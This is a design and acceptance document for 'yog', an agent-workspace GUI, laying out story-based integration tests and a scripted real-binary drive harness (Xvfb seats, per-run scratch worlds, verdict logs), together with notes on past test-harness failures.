# yog — The paved-path story ladder

**Benchmark: OpenAI Codex.** Zero-to-running is a login flow plus Enter in a
text box, and it *ends with the reply streaming* — a spawned process is not
the payoff. This document is the acceptance ladder for that path: user
stories escalating in operator skill, each rung adding features **without
burdening the rung below** — the S0 user never meets a concept from S3.
DESIGN.md remains the architecture authority; this file binds *experience*
to it and enumerates the integration tests that prove each story. A story is
done when its tests pass against the fake substrate **and** the flow works
against the real one.

Vocabulary is DESIGN §1's (no "session"): a conversation is a root agent in a
workspace; starting one is *prompt into the focused workspace, created if
none exists* (§3.4).

Premise, owned: **the entry bar is "yog".** Phase 1's was "yog + current
substrate binaries installed", with a toolchain pane naming any gap and its
exact install/upgrade command (W5); the exact-pinned embedded crates dissolved
the install story entirely and §16.7 W13 deleted the pane and the gate with it
(§16.4). S9 is that rung — the one that escalates *downward* by deleting the
premise — and its gate-shaped tests are **removed, not skipped**.

## Test harness (all stories)

Integration tests live in `tests/integration/`, modules of **one** binary
rooted at `tests/integration/main.rs` — a file directly under `tests/` is a
binary of its own, and 28 of them cost ~1.8 s of tarpaulin launch overhead and
~175 MB of duplicated linkage apiece. Only the three that mutate process-global
env (`multiplex_bl`, `multiplex_lernie`, `git_env_scrub`) stay standalone,
because "one `#[test]` per binary" *is* their soundness argument. The rest
share a process, so a fixture executable is authored through
`support::write_executable` — a plain `fs::write` on a file about to be exec'd
races a peer thread's fork into `ETXTBSY`. They drive the dispatch layer — the same
`pub` functions the shell's click-glue calls (`start::*`, `actions::*`,
`AppModel`, the view-model modules) — never egui widgets (§11's split: glue
is thin and excluded; everything a click *calls* is covered). Substrates are
fake recorder script binaries injected as `Cli::new(path)` / `Deps{…}` at
the dispatch API (the `tests/integration/editor_roundtrip.rs` idiom): each records
argv+env+cwd to a log and plays a canned stdout/exit per verb. (The
`LERNIE_BINARY`/`BL_BINARY`/`BZ_BINARY` env vars are production wiring,
covered by the existing `resolve_with` unit tests — tests never mutate
process-global env under the parallel runner.) Every story test asserts up
to three surfaces: the recorded spawns, the `ops.jsonl` trail, and the
derived view-model the shell would paint.

**Test→enabling-task map** (M6 §15; a test lands red-first *inside the
worktree of the task that turns it green* — written first, red in-worktree,
green at close; the precommit gate forbids landing red on main):

| Tests | Enabling task |
|---|---|
| S1-T2, S1-T3, INV-3, S0-T2 (seed-skip half) | Z7 (fixture; green today) |
| S0-T1, S0-T3 (abort half), S1-T1, S2-T1, S3-T1..T4, S3-T6, INV-1 | Z3 (with Z2 under it) |
| S0-T3 (ops-row + view-model halves), INV-2 | Z5 |
| S0-T5, S0-T6 | Z8 |
| S1-T4 | Z5 (view-model) |
| S3-T5, S4-T1..T3 | Z4 |
| S3-T7, S4-T4..T7 | Z10 — **landed** (bl-3b24): the board, `nav::{tabs,convs,group}` |
| S5-T3..T6 | Z11 — **landed** (bl-3b24): the three §9 editors (S5-T1/T2 died with Z6) |
| S6-T1..T5 | Z12 — **landed** (bl-3b24): `attention` (Y10) + the activity accessory |
| S7-T1..T5 | Z13 — **landed** (bl-3b24): the inspector altitudes (Y9/Y12/Y13/Y20) |
| S8-T1..T4 | Z14 — **landed** (bl-3b24): `world::{mod,hatch,marks}` (W1/W2/W4/W6) |
| S9-T1..T4 | W8–W11 — **landed** (phase 2 complete, §16.7): all three substrates are linked crates |

Z10–Z14 were the ladder's remaining enabling tasks and **all five closed
together as bl-3b24** (2026-08-07). Their rungs were already built — the board
landed with Z9/bl-de16, the editors with Y18–Y21, the world with W1–W6 — so
each task's deliverable was its row of tests, not a feature. Every row named
above now has a fake-half test at `tests/integration/stories_<row>.rs`, one
file per row; the multi-agent workspace fixtures they share live in
`tests/integration/support/{world,payload}.rs`.

**The red-first rule did not apply to this wave, and that is the honest
record.** "Written first, red in-worktree, green at close" is the discipline
for a test that *drives a feature into existence*; Z10–Z14's surfaces were
already built and already correct, so every row here was green on first run
against the tree. Nothing was found broken — what was found stale was the
*prose*, and six rows' premises are amended below and in each test's module
doc. There is no defect ball owning a red row from this wave.

**Their bl ids no longer land in DESIGN §15 M6.** §15 was retired to git
history (bl-43cd) and its task table is gone; the heading survives only so
`§15 …` citations resolve. This table is now the map's only home.

## Real-substrate drive (the second done-bar half)

The intro's done-bar has two halves: a story is done when its tests pass
**against the fake substrate** (the `tests/` harness above) *and* **the flow
works against the real one**. The fake harness proves the dispatch layer in
isolation; nothing in it exercises the installed `yog` binary, a live egui
window, or a real model wire. This section is the second half's harness — a
graduated, repeatable drive of the *real* `yog` against the *real* `lernie`
wire, so "works against the real one" is a run you can re-run, not a claim.

**One command drives it** (DESIGN §12.2 maps the files):

    make drive                            # the whole ladder, one world per verb
    make drive DRIVE_RUNS="run run-s7"    # a subset
    make drive-cleanroom                  # the same, in the §16.7 W14 room
    make drive-preflight                  # name every missing host tool at once

`make drive` builds the release binary, preflights the host, gives each run verb
its **own** scratch world under `$XDG_CACHE_HOME/yog-drive/<stamp>/<verb>/`, and
emits a log skeleton at the tail. It is never the live world and cannot be
pointed at one: the scratch root and `$XDG_DATA_HOME` are compared in both
directions and an overlap is refused outright, because a run wipes its world
before it starts. `make ux` and `make reload` are the live-world verbs; these
are not.

**The evidence root is outside the checkout on purpose.** A scratch world is not
inert data — it holds `git init` project fixtures and a nested balls delivery
territory that *mirrors the project's own path*. Nested inside the repo, that
mirror reproduces the checkout's path beneath itself, and a fixture reaching for
a delivery worktree by name (`find … -name 'bl-*'`, which matches a path
component as readily as a leaf) walks `git` up out of the scratch tree into the
real repo. The first drive run through `drive.sh` did exactly that: it committed
an agent's entire staged worktree onto its own branch as `yogdrive work`,
silently. The fixture now requires a candidate to be its **own** git toplevel —
an interior mirror directory never is — so the class is dead at the fixture as
well as at the path.

The friction that hid behind the positional scripts was not incidental — it is
why the ladder went undriven for eleven days while 177 commits landed. Four
facts had to be right before the first beat (a seat is per run; each verb wants
its own world; the driven `yog` resolves from `PATH`, so a worktree build must
be prefixed onto it; the evidence needs a home), and getting any of them wrong
was silent.

**Scripts** (`scripts/drive/`, bash, no repo deps):

- `drive.sh` — the front door the make verbs wrap: the live-world refusal, the
  `target/release` PATH prefix, one scratch world per run verb under a stamped
  evidence root, and the log skeleton. It **wraps and never replaces** —
  `stories.sh <verb> <data> <out>` and `cleanroom.sh <bin> <root> <out> [verb]`
  keep working exactly as they always have.
- `preflight.sh` — the host contract, named in full and *at once*. Before it, a
  run claimed a seat, went quiet for ten seconds and died on the first missing
  binary — one per attempt, a full seat claim spent to learn each. Its subjects
  are what the scripts actually call, verified against them: `Xvfb`, `xdotool`,
  `ffmpeg` (capture is `-f x11grab`, so ImageMagick `import`/`convert`, `scrot`
  and `xwd` are **not** subjects and never were), `python3`, `git`, the `yog`
  under drive, and the two world-seed files every run verb copies. It also
  names the **wall** contract (bl-49c6), because a host tool is not the only way
  a run can be unready: §16.2 moved brazen's config, credentials and model cache
  inside the per-workspace wall, so a newborn workspace answers brazen's shipped
  rows and nothing else until `seed_wall` copies the host's config and
  credentials into `<world>/walls/home/brazen/` — with the world seed, before the
  launch. Whether a birth template's row is one of those shipped rows is
  asked of the binary under drive through an empty `YOG_WALL` rather than
  restated here. The whole tier is **advisory** since bl-00ee retired the §9.2
  birth gate — which used to red *every* beat of *every* run over one row, with
  no workspace ever created: a workspace is now born whatever its template
  names, so a missing row or sign-in costs only the wire beats, and `run-s5s8` —
  26 beats, zero model calls — needs neither.
- `yogdrive.sh` — the seat primitive. It drives a real `yog` on an **isolated
  Xvfb display claimed per run**, never the user's live seat: synthetic
  `xdotool` input on a live seat leaks keystrokes into the operator's own apps,
  so input is confined to that display (no compositor there — XTEST works
  natively). The seat is per *run*, not per box: a hardcoded `:99` was a
  singleton, and two drives at once stole each other's window focus mid-typing
  (bl-4132). `seat` claims one — `Xvfb -displayfd` picks the free display
  itself, which a probe-then-start cannot do without racing — and prints `:N`;
  the runner exports it as `YOG_SEAT` and every later invocation inherits it,
  with no verb falling back to a default. `unseat` tears it down (the X lock
  file names the server's pid, so nothing of ours is stored).
  `launch <scratch>` spawns `yog` under `XDG_DATA_HOME=<scratch>` (with
  `WAYLAND_DISPLAY` unset, `DISPLAY=$YOG_SEAT`), finds the window by pid, and
  prints `PID WID`; `shot`/`type`/`key`/`click`/`stop` are the verbs. Capture is
  `ffmpeg -f x11grab` to a PNG. The driven `yog` resolves from `PATH`, so a
  worktree build is driven by prefixing its `target/release` — the drive
  proves the build in hand, not whatever is installed.
- `stories.sh` — the story runner, **one verb per world**. `seed <scratch>` lays
  the world seed; `run` fires S0/S1; `run-s3s4s6` fires S3/S4/S6 in a world that
  additionally holds a primed project with a ready ball; `run-s5s8` fires S5, S8
  and the residual S3/S4 ball rows in a world with a *bound* ball and **no
  conversation at all**; `run-s7` fires S7 and §6's remaining predicates in a
  world with one live conversation and a laid forensic state around it. Each
  asserts on the real surfaces (`ops.jsonl`, the workspace tree, the on-disk
  `messages/`, `ui.json`, the workspace's own git refs and branches), one
  PASS/FAIL line per beat, screenshots to `<out>` for visual review. The beat
  bodies live in sourced files — one per rung group (`beats_s3s4s6.sh`,
  `beats_s5.sh`, `beats_s8.sh`, `beats_s3res.sh`, `beats_s7.sh`, `beats_s6.sh`) —
  same helpers, same seat, split only for the repo's 300-line cap. It owns the
  **second** transport beside the seat: `gesture <data> '/line' [flags]` — one
  DESIGN §8.5 boundary gesture, `yog gesture` against the run's own scratch
  world. It takes no window id and needs no display, because the deposit
  converges through the running yog's consumer thread rather than through its
  surface; replies land in `<out>/gestures.jsonl` as the audit half.
- `cleanroom.sh` — the **standing done-bar** wrapper (§16.7 W14, below):
  `cleanroom.sh <yog-binary> <scratch-root> <out> [<any stories.sh verb>]` builds a
  room whose `PATH` is `<room>/bin:/usr/bin:/bin` — one yog binary plus the
  system's own git/sh/coreutils and the harness's Xvfb/xdotool/ffmpeg — points
  every nested root at fresh scratch, and hands the room to `stories.sh`
  unchanged. It **asserts** the scrub (`lernie`/`bl`/`bz` must all fail
  `command -v`, `yog`/`git` must both resolve) before driving anything, so the
  env is not a claim in prose but the executable precondition of the run.
- `harness.sh` — the tier every run shares, sourced by `stories.sh`: the
  assertion helpers, the two waiting primitives, the per-run seat, and the
  verdict. **The verdict has two halves and one emission.** `pass`/`fail` print
  the same PASS/FAIL line they always did *and* write one JSONL row —
  `{run, beat, label, verdict, detail, evidence, bin, at}` — to
  `<out>/verdicts.jsonl`, beside the `gestures.jsonl` the boundary transport
  writes. Neither half is a summary of the other, because both come from the
  same call; a run's verdict is now readable by a tool instead of being ~50
  printf lines and one exit code. The **label is the single source** of a beat's
  name and `beat` is only that label slugged, so nothing can drift out of step
  with the line the operator reads. `bin` is the binary the run drove, resolved
  inside the run from its own PATH — the only place that answer exists, because
  `yog` is launched unqualified and the front door prefixes the checkout's
  `target/release` onto PATH for exactly that reason.
- `logskel.sh` — a run's report starts *generated*. Sha, host tuple, load, the
  driven binary and the whole beat table are emitted from `verdicts.jsonl` —
  the binary read back off the rows, never re-asked of the generator's PATH,
  which would answer with the operator's *installed* yog (bl-d1af); every
  judgement is left as an explicit hand-finish marker. The mechanical half was both the
  dullest part of writing a drive log and the part most likely to be quietly
  wrong, because a transcribed table is a claim about a run rather than a
  reading of it. The house style — evidence quoted, not summarized — is the
  operator's half and is not generated.
- **Four worlds, on purpose.** The rungs want different fixtures, and each
  difference is load-bearing rather than incidental:
  - with **zero** workspaces the ball rung *founds* one (`home`, DESIGN
    §3.1), so its ops trail is
    `lernie new` **then** `bl claim` — the §8.1 order S3-T1 actually asserts.
    Continuing S0/S1's world would give a focused workspace (no founding, a weaker
    assertion) and would stack conversation rows above every balls-section click.
  - S5/S8's world binds a ball and **never sends the goal**: ▶ Start claims,
    the instance is then restarted, and the draft dies with it (RAM until sent,
    §8.1). So that world has a workspace with a real `config/default` lineage, a
    bound project for the marks knob, and a **zero-wire** cost — 26 beats, no
    model call. It also restarts *instead of* clicking a workspace tab, because
    focus is per-instance RAM (§13.1): nothing on disk can confirm a tab click
    landed, and startup derives the focus onto the only workspace anyway.
  - S7's world needs a conversation that *did* something, so it spends one call
    and then has state laid around it (below).
- **A fixture is the story's own gesture wherever one exists — but never a
  boundary one.** The project enters through `yog exec bl prime` in a throwaway
  `git init` repo under the scratch dir — the exact command the empty balls
  section renders (S3-T5, S8-3) — followed by `yog exec bl create`; a **foreign**
  workspace is one `yog exec lernie new` at a path under the nested
  `LERNIE_HOME`, because foreignness *is* a path (§3.1). Every one of those is a
  §8.4 hatch and **stays** one now that `/create` and friends exist, because a
  fixture laid across the boundary would write `ops.jsonl` rows of its own and
  the beats assert on that trail: `row_ok '"bl","create"'` is only a claim about
  the gesture under test while the trail holds nothing the fixture put there.
  The hatch is out-of-band by construction; the boundary is deliberately not. Where no gesture exists, the fixture writes what **lernie**
  would write and nothing yog owns: a descent branch (hierarchy lives in the id,
  §2.3, so a branch whose id is the root's plus one `<ts>-<short>` segment *is* a
  child — two hyphen-free tokens, no fewer, or it is an id lernie would never
  mint and nobody's child), `refs/lernie/budget-exhausted/*` and
  `refs/lernie/conflicted/*` (a ref *is* a mark, §6), a pending `inbox/` deposit
  under §2.11's own naming, a `request.json` that is not JSON, and — for the
  close gate — a failing `pre-commit` hook **plus a commit in the ball's
  worktree**, since a work branch identical to `main` never reaches a commit and
  so never reaches the hook. Two more are environment, not content: a scratch
  `BRAZEN_CONFIG` (historical — see the note below; a §9.1 Apply beat must never
  reach the operator's own machine) and a stub `lernie`
  missing exactly one driven verb (the §16.6 W5 gate's own shape, in eight
  lines). `rm -rf <scratch>` erases all of it. (The scratch `BRAZEN_CONFIG` that
  used to sit in this list is gone: brazen's config now lives inside the run's
  own world, at `<data>/yog/world/walls/<workspace>/brazen/config.toml`, so the
  isolation is structural rather than a var the fixture must remember.)

**The world seed (DESIGN §16.6 W3).** Before launch the runner copies the
ambient world's `world/lernie/models.yaml` (which carries a `gpt-5.4` codex
model entry) and `world/lernie/template/providers.yaml` (the provider row in
both the worker and compactor roles) into the scratch world. The `models.yaml`
*is* lernie's seeded marker, so a seeded world skips `lernie prime` — the S0-T2
general path with the seed present (§3.4), not a bootstrap branch.

**The wall seed (DESIGN §16.2, bl-49c6, bl-1851).** Nothing brazen-shaped is
shared any more: since the blast-radius ruling a workspace's provider
config, sign-ins and model cache live at `<world>/walls/<name>/brazen/*`, so a
newborn workspace's wall is an **empty directory** and the `yogdrive.sh` symlink
that used to point the scratch `brazen/credentials` at the ambient one fed
nothing. `harness.sh`'s `seed_wall` copies the host's brazen config and
credential files into that wall instead — **beside the world seed above, before
the launch**, and that is the third file of one fixture rather than a later step.
The template the seed lays names `openai-chatgpt`, which a newborn wall does not
ship; the config that defines the row and the credential that answers for it are
the other half of the same fact, and half a fact seeded late is a red beat.

**It is layable early because the leaf is a constant, not a mint.** The wall is
keyed by a *name*, and DESIGN §3.1 fixes the empty-world start's name at `home`
("a constant, not a config … and not a mint"); every run verb here opens on zero
workspaces, so every wall this harness lays is `home`'s. Seeded "after the mint"
it was always too late — yog's bare start is **one gesture**, the `lernie new`
and the detached first `lernie prompt` inside the same second, so the first model
call had already gone out against an empty wall. `S0 payoff: wire reply on disk`
was therefore structurally red from the blast-radius ruling until bl-1851, and
its literal cause — the first step's `response.json` carrying
`{"type":"error","kind":"config","message":"unknown provider openai-chatgpt"}`
— reads exactly like a wire outage to the next person to drive the rung
(bl-1851).

That same "no fixture can precede the birth" is what retired the §9.2 birth gate
(bl-00ee), and the gate stays retired on its own merits: what it lacked was never
a knowable name but anything of *yog's own* to put in the wall. A workspace is
born whatever its template names, and a missing row surfaces where it costs
something real: the wire beats. `preflight.sh` still asks the binary under drive
for a fresh wall's table and reports it at step 0 (QUALITY.md §3 step 0), as an
advisory beside the credentials.

**Beats driven, world 1** (the P0 rungs — S0+S1, the Codex bar):

- **S0 bare start** — launch to composer, type a goal, Enter: assert the argv
  trail is `lernie new` then a detached `lernie prompt` (no `prime`), the wire
  reply lands on disk, and the transcript renders it in the focused view.
- **S1 message-to-agent** — type into the focused conversation, Enter → a
  `lernie message` verb, **and the reply to it on disk** (`004-*.json`), with no
  step left holding a zero-byte `response.json`. The reply half is the beat, not
  a garnish (bl-bf79): S0's turn left the conversation quiescent, so this message
  has no live driver to hand itself to and must **revive** one — and a driver
  revived outside the workspace's wall dies on its first `bz` having spawned the
  right argv and exited 0. For four months the beat asserted only that the verb
  fired, so it passed green through every run in which the operator's second
  message got nothing back at all.
- **S1 restart-equivalence** — kill and relaunch on the same world: the
  workspace, conversation, and ops trail re-derive from disk with **no spawn
  at idle** (INV-1 / I1: restart is re-read).
- **S1 prompt-into-existing** — Enter in the focused workspace's composer →
  `lernie prompt` only, a new root agent, **no re-mint** (no `new`/`prime`).

**Beats driven, world 2** (P1's S3 + P2's S4/S6 — `run-s3s4s6`):

- **S3 ball rung** — ▶ Start on the ready ball: assert `lernie new` precedes
  `bl claim <id> --as <workspace name>` (the §8.1 order, asserted as ops line
  numbers), then Send → the detached prompt's cwd **is the ball worktree**
  (asserted against the ops row's own `cwd`, the ball rung's whole point §3.3)
  and the wire reply lands on disk.
- **S3 close** (S3-T7) — Close on the bound ball → `bl close <id> --as <bound
  workspace name>`, cwd the project; the ball is then absent from `bl list
  --json` and the *closed* listing carries `claimant: <that workspace>` — the
  one string every surface re-derives **delivered** from (row badge ash, header,
  balls section), with nothing stored to remember it.
- **S4 second conversation** — new conversation, type, Enter → a second root in
  the *same* workspace with **no re-mint**, and the bare one shows **no ball
  badge** (§3.2's honest limit).
- **S6 attention** — Stop the in-flight root → `lernie stop`, and the strip goes
  from `nothing stirs` to **`⚑ 1 need attention`** with the workspace tab and the
  row both badged. Then ↓ back onto it: the strip goes quiet, `ui.json` records
  the seen watermark, and the **state badge stays** — §6's "acknowledging clears
  the signal, not the fact", on a live wound. Both halves name the conversation
  **by its id** — the stop's own argv, and the watermark's agent key — because
  the beat is about *which* conversation the selection was on, and neither a
  count of stop rows nor the mere presence of a `seen` key can tell. Nothing is
  pressed to reach it: the start that made it selected it (DESIGN §3.4, bl-49cb),
  and the list has ranked nothing since bl-cad5, so the ↓ that once aimed at "the
  in-flight head" now only walks a round trip (bl-2d45).
- **S4 by-ball toggle** — `by ball` partitions the same rows (the delivered ball
  heading its conversation, `unassociated` trailing) while `ui.json` stays
  byte-identical and `ops.jsonl` gains no line: viewport ephemera, stored
  nowhere (§13.1). This beat and the activity one below assert a **negative**, so
  a click that missed would pass them vacuously — nothing on disk can tell the
  difference, because "stored nowhere" is the property under test. Their
  screenshots are the other half of the proof, and the log describes them.
- **S4 New workspace** (S4-T1) — the deliberate raise fires a second `lernie
  new` with the operator's typed, validated name (DESIGN §3.1 as amended at
  bl-df65), and the tab strip grows a second
  tab in name order. The raise also **focuses** what it raised (DESIGN §3.4), so
  the next Enter in the bottom composer prompts the *raised* sphere and founds
  nothing further — the beat reads that off the dispatched argv, since focus is
  per-instance RAM and appears in no file (bl-2826: without it the goal went
  silently to the workspace the operator had just left).
- **S6 activity chip** — expanding the chip and an ops row renders argv / cwd /
  exit verbatim and adds **no** ops line: the accessory is a pure read.

**Beats driven, world A** (P3's S5 + S8, and the residual S3/S4/S6 ball rows —
`run-s5s8`, zero model calls):

- **S5-T1/T2 were driven and then deleted, in that order** — a footnote worth
  keeping because it is the ladder working as designed. Against pre-W13 `main` the
  runner drove the phase-1 gate live: a capable tuple rendering an ok row per tool
  with **no** remediation text, and — relaunched against a stub `lernie` missing
  one driven verb — a mutating dispatch refusing *carrying that verdict*, as a
  `["yog-step","gate"]` ops row, with **no lernie spawn at all** and the balls
  section still fully rendered. Then W13 landed and deleted the gate, so those
  three beats were removed with it rather than left to rot: S9's "removed, not
  skipped" is now a thing that happened to a real drive, and the run is quoted in
  the 2026-07-27 `run-s5s7s8` drive.
- **S5 the §9.1 write path** (S5-T3/T4) — on the workspace's own wall config, with
  the pane's `raw config.toml` fold **opened first** (since bl-2622 the draft and
  its Apply / Reload live inside it): an Apply
  that lands, then a file changed underneath whose Apply is **refused** (bytes
  identical, `conflict — reload to re-diff`), then Reload and the *same* Apply
  landing, then a malformed draft that **cannot** land (destination byte-identical,
  `bz` itself the gate). The order is deliberate: each negative sits between two
  proofs that the same coordinate works, because a click that missed would
  satisfy a "nothing moved" assertion vacuously — which is not hypothetical: both
  negatives read PASS for as long as the stale coordinate clicked a provider row
  (bl-f8dc). The wall config is seeded **before** the pane is opened, because §9's
  freshness is the open gesture: a draft that loaded "file absent" refuses every
  Apply against a file that exists.
- **S5 the config-branch shim** (S5-T5) — a drafted file staged and `lernie
  config <ws> default` driven with yog itself as `$EDITOR`: exit 0, the file on
  `config/default`, and the checkout's own `descriptions/` **untouched** — the
  shim copied only the draft.
- **S8 the hatches** (S8-T3) — `yog env` prints exactly the world's three
  override lines (`LERNIE_HOME`, `XDG_STATE_HOME`, both nested, then the `PATH`
  prepend of `world/tools/`) and no others; `yog exec --cwd` runs its argv under
  them at the requested cwd.
- **S8 the nesting, severable** (S8-T1/T2) — the project's balls clone exists in
  the nested store and **not** in the ambient one, the ambient world's own seed
  file is byte-identical across the run, and `rm -rf <scratch>/yog` takes the
  world with it and nothing else.
- **S8 the task-branch knob** (S8-T4) — two agents resolve two balls spaces, an
  amendment moves one agent's branch and nobody else's, and the launch decides
  which space an agent gets: the policy is one key in balls' own config inside
  that space, so no yog-owned file is written.
- **S3 new ball converges** (S3-T2) — Create & Start is `bl create` then the
  existing-ball path: exactly **one** claim.
- **S4 assign / release** (S4-T2) — Assign claims a ready ball `--as` the focused
  workspace and starts **no** conversation (no mint); Release unclaims stamping
  the ball's own claimant.
- **S3 the close gate, verbatim** (S3-T4) — with a failing `pre-commit` hook and
  real work in the ball's worktree, Close's ops row carries the hook's own stderr
  and the ball stays **claimed**, not delivered.
- **S6 the chip's `M ⚠`** (S6-T5) — that live failure lights the chip's error
  count in ichor, and expanding it (and the failed row, to argv/cwd/exit/stderr)
  spawns nothing.

**Beats driven, world C** (P3's S7 + §6's remaining predicates — `run-s7`, one
model call plus one stamped-goal call):

- **S7 the descent** (S7-T5) — a single-agent conversation has **no** descent to
  unfold; with a child laid, the conversation's list row unfolds one row per
  member, and selecting the member retargets the inspector *and* records the
  **child's** own acknowledgement watermark in `ui.json` — which is how a
  selection that lives in RAM leaves a fact on disk. Re-pointed by bl-8905 from
  the altitude-1 descent tree onto the list that replaced it.
- **S7 the drill-in survives bad bytes** (S7-T2) — a `request.json` that is not
  JSON renders verbatim under the §11 **error row** ("unparseable JSON — bytes
  verbatim below", in ichor), its sibling tabs still build, yog stays alive, and
  the ops trail does not grow. The framing is the bl-307f fix: rendered bare, a
  malformed file was indistinguishable from a file whose content happens to be
  that text.
- **S7 the inbox** (S7-T4) — the tab explains `✉n` with from/deposited_at/epitaph
  parsed, and the flush dispatches `lernie scan <ws>` (the composer's `Scan`, not
  a second button in the tab). The verb's own exit is upstream's: on this tuple
  `lernie scan` fails for a **root** recipient, surfaced verbatim (bl-a942).
- **S6 the ref-marked predicates** (S6-T1 rules 3/4) — `budget-exhausted` and
  `conflicted` marks stir the strip, and one ↓ from a cleared selection writes
  *both* watermarks: the world also holds a strictly **newer** unmarked root, so
  a sort by recency alone would have landed there and recorded nothing —
  attention outranks recency, asserted rather than assumed.
- **S6 mail is not silenceable** (S6-T1 rule 5) — pending mail with the lock free
  keeps stirring after the ack, and **no** `mail` watermark exists to write.
- **S6 the ack converges** (S6-T2) — a second instance over the same `ui.json`
  renders the acked state and adds no ops line.
- **S4 the uncoloured id** (S4-T4's remaining case) — a goal stamped `Ball
  bl-9999:` in a world whose join knows no such ball: the stamp is on disk and the
  badge renders the id with no colour.
- **S4 the tab strip's overflow and pins** (S4-T7) — a foreign workspace falls to
  the ⋯ menu (hidden while empty), and ★ hoists it into the tabs with the pin
  durable in `ui.json`.

**A gesture must not ride on pixels.** A hardcoded click coordinate is a
standing regression source against a live UI: a row inserted above a target
silently retargets every click below it — the 2026-07-24 run's S1 message beat
fired a *prompt* because the conversation list had grown its `recent | by ball`
toggle where the beat clicked. The reason it is a regression source is worth
naming exactly: **a coordinate is not a spelling.** It is a measurement of a
layout, and a layout is not something yog promises. So the runner's steering
rule is to drive a **named** spelling, and there are exactly two.

**(1) The DESIGN §11 keyboard binding, where the beat's subject is the window.**
↓/↑ step the focused workspace's visible conversation rows (DESIGN §11 as
amended by bl-fa82; ←/→ unfold one) and land through the `focus_agent`
path, selecting an agent in one key — which
is why the runner's whole selection gesture is a single `xdotool key Down` where
it was once a workspace-tab click plus a conversation-row click; the workspace
is the tab bar's now, since the walk no longer crosses a wall; digits 1–5 pick
an inspector tab the same way. S0/S1 are windowed rungs end to end and carry no
coordinate at all.

**(2) The DESIGN §8.5 control boundary, where it is not** — VISION §4.8's last
consequence, verbatim: *"The drive harness stops steering pixels: story beats
address the headless surface, and screenshots become what they always should
have been — visual confirmation, not the transport."* `stories.sh`'s `gesture`
helper is `yog gesture '/line' --ws … --project … --as …`: the same `Gesture`
the window's click-glue constructs, deposited into the **running** yog's
gestures inbox and dispatched by its own consumer thread. Three things follow,
and they are why this is not merely a tidier click:

- **It needs no seat.** A boundary gesture is named, not aimed — no display, no
  window id, nothing to measure. The terminal holds no selection, so the line
  states its targets outright; those flags *are* §8.5's "a seat with no
  selection spells its targets".
- **It is its own receipt**, so no `until_landed` wraps one. That primitive
  exists because a click has no reply and may have hit blank panel; a deposit
  answers or times out, and `yog gesture` exits on the verdict.
- **The screenshot after it now proves something it never could** — that the
  window converged on a gesture *it did not fire*. Deposit → consumer →
  watcher → re-derivation → frame is the whole I0 claim, photographed.

**A §11 rule-2 pick is a pick only at the pointer.** Rule 2 ("choosing among
several targets stays a pointer gesture") bounds the *keymap*, not the surface:
where the thing picked has an address, the line names it. That is what retired
`assign →`'s coordinate — `/assign <id>` says which ball outright — and the
`+ new ball` form's four (a fold, two text boxes, a per-project button, all of
them measurements of a side panel whose width follows the scratch directory's
name), since `Create & Start` is `Action::Prepare` with a `BallSpec::New` and
`/prepare ball --new <title> --body <text>` is that variant, typed. bl-3f46's
config wave then retired six more the same way: the lineage Send's form becomes
`/config branch <lineage> <path> <text…>`, and the task-branch knob's buttons
become `/marks <branch>` — one word, the branch itself, since the
per-agent ruling made the knob an agent's tracking space rather than a
project's publish policy (bl-e47b).

**A surviving coordinate is DERIVED, not pinned (bl-b9f2).** The rule above
retires clicks; this one governs the clicks it cannot retire. "Measure it
against a screenshot, and re-measure when the layout changes" was the runner's
standing instruction and it failed three times in three weeks — bl-2622,
bl-f8dc, then bl-b9f2, where bl-5410 gave each of brazen's seven provider rows
its own wrapped hint line and moved the §9.1 raw fold 119 px below the pixel two
beats were still clicking. The re-measure only ever happens *after* a beat has
been red for a day, because a pinned number is a second representation of a
layout and nothing tells it the layout moved. So a beat that must use the
pointer reads its point off the frame it is about to drive, from a structure
that moves with the layout: `scripts/drive/locate.sh` finds the `ui.separator()`
that ends brazen's pane in the run's own screenshot and folds every §9.1 point
off it — the fold, the raw editor, Apply and Reload. What stays written down is
a distance *inside one widget* — a fold's header-to-body gap, a
`desired_rows(6)` box's height, the button row beneath it — which only that
widget's own contents can invalidate.

**bl-5cce then put the runner's other eight coordinates through the rungs
above, and there is now no pinned pixel left in the harness at all.** One fell
to rung 2: the marks pane's `Read current` was still being pressed at a measured
point tagged "no spelling exists", six weeks after bl-0164 landed `/marks` bare —
and the beat had been firing that very line two statements below the click. Six
were views with no spelling by design and are derived off three anchors
(`locate.sh`'s four surfaces): the §11 tab bar's own rule and the window's right
edge for the ⋯ overflow and the ★ in its menu, the centre's header/tab-strip
separator for the inspector's Raw toggle, step selector and record picker, and
the window's *bottom* edge for the activity trail's newest ops row — which the
§11 tail idiom seats there whatever the chip heading, the trail controls or the
§7.2 staleness notes do above it. **What that pass found is the argument's
sharpest form.** Five of the eight had already drifted and no beat had noticed:
bl-1ff1 put a Raw checkbox above the Steps tab's step selector and bl-1ca2 put a
whole centre tab strip above the inspector, so S7's three clicks had spent twelve
days landing on blank panel; the marks click had been ~119 px stale since
bl-5410 and was landing in the *lernie* editor two panes down. Every one of those
beats printed PASS throughout, because a pinned coordinate whose beat asserts a
negative is not a test — it is a number that only a human re-measure can falsify,
and the re-measure never comes.

**What a coordinate still means, in three kinds.** Every remaining click is
tagged in the runner with which kind it is, and they are not interchangeable:

- **A VIEW — no spelling exists, by design.** §8.5 gives views no boundary
  representation on purpose, so there is nothing to prefer over a pointer:
  focusing a text box (§8.5's own example), the center tabs and the inspector tabs
  ("switching tab doesn't"), the Raw toggle, which descent-tree member or ops
  row or step record to open, the ★ pin and the balls fold (§4.1 presentation
  durables, which §8.5 keeps on the views' side outright). Permanent, not debt —
  and since bl-5cce every one of them that a beat actually drives is derived per
  run rather than written down.
  **One of these got narrower (bl-f6fe):** selecting a conversation is still a
  view and still has no spelling — but the *acknowledgement* it carries now
  does, as `/seen`, because a seat with no focus cannot acknowledge by looking
  (S14, DESIGN §8.5). The pointer gesture is unchanged; what changed is that a
  headless seat is no longer unable to answer the strip.
- **A FRAME-ONLY entry — a spelling exists and is the wrong one.** The three §9
  file editors' Apply stays on `Editor`/`BrazenEditor` because the pane holds a
  long-lived RAM draft and the §9 hash guard is over *that draft*; a deposit has
  none, so `/config brazen` degenerates the guard to a must-not-exist check.
  S5-T4 (the guard) and S5-T3 (the malformed draft that cannot land) are
  assertions about the draft, so the pointer is their only honest seat. Also
  permanent, and for a reason §8.5 states. **The §11 focus floor (bl-478d) does
  not retire it either, and bl-b9f2 re-asked that at the source rather than
  taking the claim on.** `form_ui::raw_editor` ends in `.code_editor()`, which
  in egui 0.29 is `.font(Monospace).lock_focus(true)`, and `lock_focus` sets the
  box's `EventFilter { tab: true }` — so while it holds focus, Tab *and*
